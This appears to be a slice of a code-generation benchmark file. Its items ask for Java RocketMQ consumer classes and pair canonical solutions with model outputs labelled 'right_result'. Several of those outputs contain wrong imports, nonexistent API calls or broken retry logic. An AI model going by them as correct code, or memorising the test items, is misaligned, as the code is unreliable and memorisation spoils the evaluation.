  {
    "Task_id": 372,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously process messages from a specified topic, handling message consumption with retry logic for failed messages.\n\nClass Description: The PlanConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specific topic, processes incoming messages, and implements retry logic for failed message consumption. The consumer is configured to start automatically after bean initialization.\n\nAttributes:\n- consumerGroup: String - The consumer group name for the RocketMQ consumer, injected from properties\n- namesrvAddr: String - The NameServer address for RocketMQ, injected from properties\n- logger: Logger - SLF4J logger instance for logging messages and errors\n\nMethods:\n- defaultMQPushConsumer(): void - Initializes and starts the RocketMQ consumer. This method is automatically called after bean construction (@PostConstruct). It:\n  1. Creates a DefaultMQPushConsumer instance\n  2. Configures NameServer address\n  3. Subscribes to the specified topic with wildcard tag filter\n  4. Sets consumption offset strategy\n  5. Registers a concurrent message listener\n  6. Starts the consumer\n  The message listener processes messages, logs successful consumption, and implements retry logic (up to 3 attempts) for failed messages.\n\nInput: None (Configuration is injected via @Value annotations)\n\nOutput: None (The consumer runs continuously, processing messages as they arrive)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport top.lrshuai.mq.comment.Const;\nimport top.lrshuai.mq.test.entity.AccountPlan;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class PlanConsumer {\n\n    @Value(\"${apache.rocketmq.consumer.PushConsumer}\")\n    private String consumerGroup;\n\n    @Value(\"${apache.rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    private Logger logger = LoggerFactory.getLogger(this.getClass());\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        try {\n            consumer.subscribe(Const.PLAN_TOPIC, \"*\");\n            consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n            consumer.registerMessageListener((MessageListenerConcurrently) (list, context) -> {\n                MessageExt tempMsg = null;\n                try {\n                    for (MessageExt msg : list) {\n                        tempMsg = msg;\n                        String messageBody = new String(msg.getBody(), \"utf-8\");\n                        AccountPlan plan = JSON.parseObject(messageBody, AccountPlan.class);\n                        logger.info(\"\u6d88\u8d39\u6210\u529f\uff1amsgId={}\uff0cplan={}\", msg.getMsgId(), plan);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    if(tempMsg.getReconsumeTimes() == 3) {\n                        logger.error(\"msg consume error by:{}\", tempMsg);\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.Value;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@Component\npublic class PlanConsumer {\n\n    private static final Logger logger = LoggerFactory.getLogger(PlanConsumer.class);\n\n    @Value(\"${rocketmq.consumer.group}\")\n    private String consumerGroup;\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void defaultMQPushConsumer() throws Exception {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(\"TestTopic\", \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                try {\n                    // Simulate message processing logic\n                    logger.info(\"Received message: {}\", new String(msg.getBody()));\n                    return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                } catch (Exception e) {\n                    logger.error(\"Failed to process message: {}\", new String(msg.getBody()), e);\n                    int retryTimes = context.getRetryTimes();\n                    if (retryTimes < 3) {\n                        logger.warn(\"Retrying message consumption, attempt {}\", retryTimes + 1);\n                        return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                    } else {\n                        logger.error(\"Max retries reached. Message will be discarded.\");\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    }\n                }\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n\n        consumer.start();\n        logger.info(\"RocketMQ consumer started.\");\n    }\n}\n```"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class that sets up a RocketMQ push consumer (`DefaultMQPushConsumer`). It configures the consumer with NameServer address, consumption strategy, topic subscriptions with tags, and registers a message listener. The consumer is started asynchronously after a delay.\n\nAttributes:\n- `paascloudProperties`: [PaascloudProperties] - Contains configuration properties for the RocketMQ consumer, including NameServer address and consumer group.\n- `optPushConsumer`: [OptPushMessageListener] - The message listener implementation that handles incoming messages.\n- `taskExecutor`: [TaskExecutor] - Executor service used to start the consumer asynchronously.\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer. Sets the NameServer address, consumption strategy, subscribes to topics with tags, registers the message listener, and starts the consumer asynchronously after a delay. Throws `MQClientException` if there's an error in consumer configuration.\n\nThe class follows Spring's dependency injection pattern and uses `@Bean` to expose the consumer instance to the Spring context. The consumer is started in a separate thread to avoid blocking the main application startup.",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.consumer.listener.OptPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.core.task.TaskExecutor;\n\nimport javax.annotation.Resource;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private OptPushMessageListener optPushConsumer;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.OPT.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(optPushConsumer);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                e.printStackTrace();\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageSelector;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private OptPushMessageListener optPushConsumer;\n\n    @Autowired\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getRocketmq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getRocketmq().getNameServer());\n        consumer.setMessageModel(MessageModel.CLUSTERING);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        consumer.subscribe(\"TopicTest\", MessageSelector.byTag(\"TagA\"));\n        consumer.subscribe(\"AnotherTopic\", MessageSelector.byTag(\"TagB\"));\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            return optPushConsumer.consumeMessage(msgs, context);\n        });\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                throw new RuntimeException(e);\n            }\n        });\n\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: Implement a RocketMQ consumer class that handles message consumption from a Logical Message Queue (LMQ) using POP mode, with proper initialization, message processing, and cleanup functionality.\n\nClass Description: LMQPushPopConsumer is a Java class that demonstrates how to consume messages from a RocketMQ Logical Message Queue (LMQ) using POP (Pull-on-Poll) mode. It handles consumer initialization, topic subscription, message processing, and resource cleanup.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the target broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The Logical Message Queue topic name (prefixed with LMQ_PREFIX)\n- NAMESRV_ADDR: [String] - The NameServer address\n- CONSUMER_GROUP: [String] - The consumer group name\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n- mqAdminExt: [DefaultMQAdminExt] - The RocketMQ admin tool instance\n\nMethods:\n- initializeConsumer(): [void] -> [void] - Initializes the consumer by setting up POP mode, configuring consumer properties, subscribing to the topic, and registering a message listener\n- switchPop(): [void] -> [void] - Configures the broker to use POP mode for message consumption\n- shutdown(): [void] -> [void] - Shuts down the consumer and admin instances to release resources",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageRequestMode;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\nimport org.apache.rocketmq.tools.admin.DefaultMQAdminExt;\n\npublic class LMQPushPopConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"456\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_POP_1\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n    private DefaultMQAdminExt mqAdminExt;\n\n    public void initializeConsumer() throws Exception {\n        switchPop();\n\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.setClientRebalance(false);\n        consumer.start();\n\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    private void switchPop() throws Exception {\n        mqAdminExt = new DefaultMQAdminExt();\n        mqAdminExt.setNamesrvAddr(NAMESRV_ADDR);\n        mqAdminExt.start();\n        List<BrokerData> brokerDatas = mqAdminExt.examineTopicRouteInfo(TOPIC).getBrokerDatas();\n        for (BrokerData brokerData : brokerDatas) {\n            Set<String> brokerAddrs = new HashSet<>(brokerData.getBrokerAddrs().values());\n            for (String brokerAddr : brokerAddrs) {\n                mqAdminExt.setMessageRequestMode(brokerAddr, LMQ_TOPIC, CONSUMER_GROUP, MessageRequestMode.POP, 8,\n                    3_000);\n            }\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n        if (mqAdminExt != null) {\n            mqAdminExt.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.tools.admin.DefaultMQAdminExt;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class LMQPushPopConsumer {\n    private static final String CLUSTER_NAME = \"DefaultCluster\";\n    private static final String BROKER_NAME = \"BrokerA\";\n    private static final String TOPIC = \"TestTopic\";\n    private static final String LMQ_TOPIC = \"LMQ:TestTopic\";\n    private static final String NAMESRV_ADDR = \"localhost:9876\";\n    private static final String CONSUMER_GROUP = \"LMQConsumerGroup\";\n    private static final Map<Long, String> BROKER_ADDR_MAP = new HashMap<>();\n    private DefaultMQPushConsumer consumer;\n    private DefaultMQAdminExt mqAdminExt;\n\n    public void initializeConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n\n        switchPop();\n\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n\n        consumer.start();\n        System.out.println(\"LMQ Push-Pop Consumer started.\");\n    }\n\n    public void switchPop() throws Exception {\n        mqAdminExt = new DefaultMQAdminExt();\n        mqAdminExt.setNamesrvAddr(NAMESRV_ADDR);\n        mqAdminExt.start();\n\n        Map<String, String> properties = new HashMap<>();\n        properties.put(\"popMode\", \"true\");\n        mqAdminExt.updateBrokerConfig(BROKER_NAME, properties);\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n        if (mqAdminExt != null) {\n            mqAdminExt.shutdown();\n        }\n        System.out.println(\"LMQ Push-Pop Consumer shut down.\");\n    }\n\n    public static void main(String[] args) throws Exception {\n        LMQPushPopConsumer lmqConsumer = new LMQPushPopConsumer();\n        lmqConsumer.initializeConsumer();\n        Thread.sleep(60000);\n        lmqConsumer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with Spring integration capabilities, allowing for configuration through properties and proper lifecycle management.\n\nClass Description: The Consumer class is a Spring FactoryBean that creates and manages a RocketMQ DefaultMQPushConsumer instance. It implements InitializingBean for initialization and DisposableBean for cleanup, providing a convenient way to integrate RocketMQ consumers into Spring applications. The class offers extensive configuration options for consumer behavior and performance tuning.\n\nAttributes:\n\nconsumerGroup: String - The consumer group name for this consumer\nnamesrvAddr: String - The address of the NameServer\ninstanceName: String - The instance name for this consumer\nmessageModel: MessageModel - The message model (CLUSTERING or BROADCASTING)\nconsumeThreadMin: int - Minimum thread pool size for message consumption\nconsumeThreadMax: int - Maximum thread pool size for message consumption\npullThresholdForQueue: int - Flow control threshold for queue\npullThresholdSizeForQueue: int - Flow control threshold for queue size\nconsumeMessageBatchMaxSize: int - Maximum number of messages consumed in one batch\npullBatchSize: int - Maximum number of messages pulled in one batch\nmaxReconsumeTimes: int - Maximum number of retry attempts\nconsumeTimeout: long - Timeout for message consumption\ntopic: String - The topic to subscribe to\ntags: String - The tag filter for subscribed messages\nmessageListener: MessageListenerConcurrently - The listener for processing received messages\nconsumer: DefaultMQPushConsumer - The actual RocketMQ consumer instance\n\nMethods:\n\nafterPropertiesSet(): void - Initializes and starts the consumer after properties are set (from InitializingBean)\ndestroy(): void - Shuts down the consumer when the Spring context is destroyed (from DisposableBean)\ngetObject(): DefaultMQPushConsumer - Returns the consumer instance (from FactoryBean)\ngetObjectType(): Class<?> - Returns the consumer class type (from FactoryBean)\nisSingleton(): boolean - Indicates this is a singleton bean (from FactoryBean)\nsetConsumerGroup(String): void - Sets the consumer group name\nsetNamesrvAddr(String): void - Sets the NameServer address\nsetInstanceName(String): void - Sets the instance name\nsetMessageModel(String): void - Sets the message model\nsetConsumeThreadMin(int): void - Sets minimum consumption threads\nsetConsumeThreadMax(int): void - Sets maximum consumption threads\nsetPullThresholdForQueue(int): void - Sets queue flow control threshold\nsetPullThresholdSizeForQueue(int): void - Sets queue size flow control threshold\nsetConsumeMessageBatchMaxSize(int): void - Sets batch consumption size\nsetPullBatchSize(int): void - Sets pull batch size\nsetMaxReconsumeTimes(int): void - Sets maximum retry attempts\nsetConsumeTimeout(long): void - Sets consumption timeout\nsetTopic(String): void - Sets subscription topic\nsetTags(String): void - Sets message tag filter\nsetMessageListener(MessageListenerConcurrently): void - Sets the message listener",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.beans.factory.FactoryBean;\nimport org.springframework.beans.factory.InitializingBean;\n\npublic class Consumer implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n\n    private DefaultMQPushConsumer consumer;\n\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private MessageModel messageModel = MessageModel.CLUSTERING;\n    private int consumeThreadMin = 20;\n    private int consumeThreadMax = 64;\n    private int pullThresholdForQueue = 1000;\n    private int pullThresholdSizeForQueue = 100;\n    private int consumeMessageBatchMaxSize = 1;\n    private int pullBatchSize = 32;\n    private int maxReconsumeTimes = -1;\n    private long consumeTimeout = 15;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(instanceName);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n        consumer.subscribe(topic, tags);\n        consumer.registerMessageListener(messageListener);\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() throws Exception {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = MessageModel.valueOf(messageModel);\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageModel;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.beans.factory.FactoryBean;\nimport org.springframework.beans.factory.InitializingBean;\n\npublic class RocketMQPushConsumerFactory implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName = \"DEFAULT\";\n    private MessageModel messageModel = MessageModel.CLUSTERING;\n    private int consumeThreadMin = 20;\n    private int consumeThreadMax = 64;\n    private int pullThresholdForQueue = 1000;\n    private int pullThresholdSizeForQueue = 100;\n    private int consumeMessageBatchMaxSize = 1;\n    private int pullBatchSize = 32;\n    private int maxReconsumeTimes = 16;\n    private long consumeTimeout = 15000;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n    private DefaultMQPushConsumer consumer;\n\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setInstanceName(instanceName);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout((int) (consumeTimeout / 1000));\n\n        if (topic != null && !topic.isEmpty()) {\n            consumer.subscribe(topic, tags);\n        }\n\n        if (messageListener != null) {\n            consumer.registerMessageListener(messageListener);\n        }\n\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() throws Exception {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = MessageModel.valueOf(messageModel);\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}\n```"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to asynchronously receive and process messages from a specified topic with tag filtering.\n\nClass Description: The PushConsumer class is a RocketMQ message consumer that subscribes to a topic and processes incoming messages using a concurrent message listener. It supports broadcasting message model and can be configured with various consumption strategies.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address for RocketMQ\n- TOPIC: [String] - The topic to subscribe to for messages\n- SUB_EXPRESSION: [String] - Tag filter expression for message subscription\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- PushConsumer() [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers the message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.remoting.protocol.heartbeat.MessageModel;\n\npublic class PushConsumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_1\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n    public static final String SUB_EXPRESSION = \"TagA || TagC || TagD\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n        consumer.subscribe(TOPIC, SUB_EXPRESSION);\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Broadcast Consumer Started.%n\");\n    }\n\n    public void 